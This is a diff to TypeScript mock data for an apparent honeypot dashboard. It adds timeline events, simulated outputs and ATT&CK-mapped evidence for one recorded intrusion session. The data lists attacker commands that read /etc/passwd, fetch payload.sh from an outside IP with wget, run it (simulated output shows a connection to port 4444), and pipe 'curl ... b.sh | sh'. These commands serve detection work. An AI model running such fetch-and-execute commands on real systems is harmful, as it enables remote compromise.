@@ -283,6 +283,15 @@ export const sessionTimelines: Record<string, SessionTimelineEvent[]> = {
     },
     {
       id: "tl-5",
+      timestamp: at("14:31:13"),
+      kind: "command",
+      label: "cat /etc/os-release",
+      detail: "Distribution fingerprinting",
+      severity: "medium",
+      techniqueId: "T1082",
+    },
+    {
+      id: "tl-6",
       timestamp: at("14:31:16"),
       kind: "command",
       label: "cat /etc/passwd",
@@ -291,7 +300,16 @@ export const sessionTimelines: Record<string, SessionTimelineEvent[]> = {
       techniqueId: "T1087",
     },
     {
-      id: "tl-6",
+      id: "tl-7",
+      timestamp: at("14:31:20"),
+      kind: "command",
+      label: "ls -la /tmp",
+      detail: "Writable directory discovery ahead of the download",
+      severity: "low",
+      techniqueId: "T1083",
+    },
+    {
+      id: "tl-8",
       timestamp: at("14:31:24"),
       kind: "download",
       label: "wget http://31.44.185.9/payload.sh",
@@ -300,7 +318,7 @@ export const sessionTimelines: Record<string, SessionTimelineEvent[]> = {
       techniqueId: "T1105",
     },
     {
-      id: "tl-7",
+      id: "tl-9",
       timestamp: at("14:31:29"),
       kind: "file",
       label: "chmod +x payload.sh",
@@ -309,7 +327,7 @@ export const sessionTimelines: Record<string, SessionTimelineEvent[]> = {
       techniqueId: "T1222",
     },
     {
-      id: "tl-8",
+      id: "tl-10",
       timestamp: at("14:31:34"),
       kind: "execution",
       label: "./payload.sh",
@@ -318,7 +336,16 @@ export const sessionTimelines: Record<string, SessionTimelineEvent[]> = {
       techniqueId: "T1059",
     },
     {
-      id: "tl-9",
+      id: "tl-11",
+      timestamp: at("14:31:40"),
+      kind: "command",
+      label: "crontab -l",
+      detail: "Persistence check following execution",
+      severity: "medium",
+      techniqueId: "T1053",
+    },
+    {
+      id: "tl-12",
       timestamp: at("14:32:10"),
       kind: "disconnect",
       label: "Session closed by peer",
@@ -330,12 +357,15 @@ export const sessionTimelines: Record<string, SessionTimelineEvent[]> = {
 const commandOutputs: Record<string, string> = {
   whoami: "root",
   "uname -a": "Linux honeypot 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux",
+  "cat /etc/os-release": 'PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"',
   "cat /etc/passwd":
     "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nsshd:x:106:65534::/run/sshd:/usr/sbin/nologin",
+  "ls -la /tmp": "drwxrwxrwt 3 root root 4096 Aug 27 14:31 .\ndrwxr-xr-x 20 root root 4096 . ..",
   "wget http://31.44.185.9/payload.sh":
     "--2026-08-27 14:31:24--  http://31.44.185.9/payload.sh\nSaving to: 'payload.sh'  [4.2K]",
   "chmod +x payload.sh": "",
   "./payload.sh": "connecting to 31.44.185.9:4444 ...",
+  "crontab -l": "no crontab for root",
 };
 
 function eventFor(session: AttackSession, index: number, tl: SessionTimelineEvent): HoneypotEvent {
@@ -512,19 +542,41 @@ export const analysisFor8F42A1: SessionAnalysis = {
   observedBehavior: [
     {
       label: "System reconnaissance",
-      evidence: [{ artifact: "uname -a", sessionId: "SESSION-8F42A1", timestamp: at("14:31:11") }],
+      evidence: [
+        {
+          artifact: "uname -a",
+          sessionId: "SESSION-8F42A1",
+          timestamp: at("14:31:11"),
+          eventId: "SESSION-8F42A1-ev-3",
+        },
+      ],
     },
     {
       label: "User / account discovery",
       evidence: [
-        { artifact: "whoami", sessionId: "SESSION-8F42A1", timestamp: at("14:31:08") },
-        { artifact: "cat /etc/passwd", sessionId: "SESSION-8F42A1", timestamp: at("14:31:16") },
+        {
+          artifact: "whoami",
+          sessionId: "SESSION-8F42A1",
+          timestamp: at("14:31:08"),
+          eventId: "SESSION-8F42A1-ev-2",
+        },
+        {
+          artifact: "cat /etc/passwd",
+          sessionId: "SESSION-8F42A1",
+          timestamp: at("14:31:16"),
+          eventId: "SESSION-8F42A1-ev-5",
+        },
       ],
     },
     {
       label: "File system discovery",
       evidence: [
-        { artifact: "ls -la /tmp", sessionId: "SESSION-8F42A1", timestamp: at("14:31:20") },
+        {
+          artifact: "ls -la /tmp",
+          sessionId: "SESSION-8F42A1",
+          timestamp: at("14:31:20"),
+          eventId: "SESSION-8F42A1-ev-6",
+        },
       ],
     },
     {
@@ -534,19 +586,30 @@ export const analysisFor8F42A1: SessionAnalysis = {
           artifact: "wget http://31.44.185.9/payload.sh",
           sessionId: "SESSION-8F42A1",
           timestamp: at("14:31:24"),
+          eventId: "SESSION-8F42A1-ev-7",
         },
       ],
     },
     {
       label: "File permission modification",
       evidence: [
-        { artifact: "chmod +x payload.sh", sessionId: "SESSION-8F42A1", timestamp: at("14:31:29") },
+        {
+          artifact: "chmod +x payload.sh",
+          sessionId: "SESSION-8F42A1",
+          timestamp: at("14:31:29"),
+          eventId: "SESSION-8F42A1-ev-8",
+        },
       ],
     },
     {
       label: "Payload execution",
       evidence: [
-        { artifact: "./payload.sh", sessionId: "SESSION-8F42A1", timestamp: at("14:31:34") },
+        {
+          artifact: "./payload.sh",
+          sessionId: "SESSION-8F42A1",
+          timestamp: at("14:31:34"),
+          eventId: "SESSION-8F42A1-ev-9",
+        },
       ],
     },
   ],
@@ -554,22 +617,50 @@ export const analysisFor8F42A1: SessionAnalysis = {
     {
       label: "External download URL (http://31.44.185.9/payload.sh)",
       severity: "critical",
-      evidence: [{ artifact: "wget http://31.44.185.9/payload.sh", sessionId: "SESSION-8F42A1" }],
+      evidence: [
+        {
+          artifact: "wget http://31.44.185.9/payload.sh",
+          sessionId: "SESSION-8F42A1",
+          timestamp: at("14:31:24"),
+          eventId: "SESSION-8F42A1-ev-7",
+        },
+      ],
     },
     {
       label: "Shell script execution from writable directory",
       severity: "high",
-      evidence: [{ artifact: "./payload.sh", sessionId: "SESSION-8F42A1" }],
+      evidence: [
+        {
+          artifact: "./payload.sh",
+          sessionId: "SESSION-8F42A1",
+          timestamp: at("14:31:34"),
+          eventId: "SESSION-8F42A1-ev-9",
+        },
+      ],
     },
     {
       label: "Privilege level: root",
       severity: "high",
-      evidence: [{ artifact: "whoami → root", sessionId: "SESSION-8F42A1" }],
+      evidence: [
+        {
+          artifact: "whoami → root",
+          sessionId: "SESSION-8F42A1",
+          timestamp: at("14:31:08"),
+          eventId: "SESSION-8F42A1-ev-2",
+        },
+      ],
     },
     {
       label: "Persistence-related activity observed post-execution",
       severity: "medium",
-      evidence: [{ artifact: "crontab -l", sessionId: "SESSION-8F42A1" }],
+      evidence: [
+        {
+          artifact: "crontab -l",
+          sessionId: "SESSION-8F42A1",
+          timestamp: at("14:31:40"),
+          eventId: "SESSION-8F42A1-ev-10",
+        },
+      ],
     },
   ],
   recommendedActions: [
@@ -610,6 +701,7 @@ export const analysisFor8F42A1: SessionAnalysis = {
           artifact: "14 failed logins before root/123456 accepted",
           sessionId: "SESSION-8F42A1",
           timestamp: at("14:31:05"),
+          eventId: "SESSION-8F42A1-ev-1",
         },
       ],
       relatedCommands: [],
@@ -623,8 +715,18 @@ export const analysisFor8F42A1: SessionAnalysis = {
       tactic: "Discovery",
       confidence: 0.93,
       evidence: [
-        { artifact: "whoami", sessionId: "SESSION-8F42A1", timestamp: at("14:31:08") },
-        { artifact: "cat /etc/passwd", sessionId: "SESSION-8F42A1", timestamp: at("14:31:16") },
+        {
+          artifact: "whoami",
+          sessionId: "SESSION-8F42A1",
+          timestamp: at("14:31:08"),
+          eventId: "SESSION-8F42A1-ev-2",
+        },
+        {
+          artifact: "cat /etc/passwd",
+          sessionId: "SESSION-8F42A1",
+          timestamp: at("14:31:16"),
+          eventId: "SESSION-8F42A1-ev-5",
+        },
       ],
       relatedCommands: ["whoami", "cat /etc/passwd", "id"],
       aiExplanation: "Enumeration of the current principal and all local accounts.",
@@ -636,8 +738,18 @@ export const analysisFor8F42A1: SessionAnalysis = {
       tactic: "Discovery",
       confidence: 0.96,
       evidence: [
-        { artifact: "uname -a", sessionId: "SESSION-8F42A1", timestamp: at("14:31:11") },
-        { artifact: "cat /etc/os-release", sessionId: "SESSION-8F42A1", timestamp: at("14:31:13") },
+        {
+          artifact: "uname -a",
+          sessionId: "SESSION-8F42A1",
+          timestamp: at("14:31:11"),
+          eventId: "SESSION-8F42A1-ev-3",
+        },
+        {
+          artifact: "cat /etc/os-release",
+          sessionId: "SESSION-8F42A1",
+          timestamp: at("14:31:13"),
+          eventId: "SESSION-8F42A1-ev-4",
+        },
       ],
       relatedCommands: ["uname -a", "cat /etc/os-release"],
       aiExplanation:
@@ -654,6 +766,7 @@ export const analysisFor8F42A1: SessionAnalysis = {
           artifact: "wget http://31.44.185.9/payload.sh",
           sessionId: "SESSION-8F42A1",
           timestamp: at("14:31:24"),
+          eventId: "SESSION-8F42A1-ev-7",
         },
       ],
       relatedCommands: ["wget http://31.44.185.9/payload.sh"],
@@ -667,7 +780,12 @@ export const analysisFor8F42A1: SessionAnalysis = {
       tactic: "Defense Evasion",
       confidence: 0.81,
       evidence: [
-        { artifact: "chmod +x payload.sh", sessionId: "SESSION-8F42A1", timestamp: at("14:31:29") },
+        {
+          artifact: "chmod +x payload.sh",
+          sessionId: "SESSION-8F42A1",
+          timestamp: at("14:31:29"),
+          eventId: "SESSION-8F42A1-ev-8",
+        },
       ],
       relatedCommands: ["chmod +x payload.sh"],
       aiExplanation: "Execution bit set on the downloaded artifact immediately before invocation.",
@@ -679,7 +797,12 @@ export const analysisFor8F42A1: SessionAnalysis = {
       tactic: "Execution",
       confidence: 0.95,
       evidence: [
-        { artifact: "./payload.sh", sessionId: "SESSION-8F42A1", timestamp: at("14:31:34") },
+        {
+          artifact: "./payload.sh",
+          sessionId: "SESSION-8F42A1",
+          timestamp: at("14:31:34"),
+          eventId: "SESSION-8F42A1-ev-9",
+        },
       ],
       relatedCommands: ["./payload.sh", "curl -s http://31.44.185.9/b.sh | sh"],
       aiExplanation: "Downloaded shell script invoked directly with root privileges.",
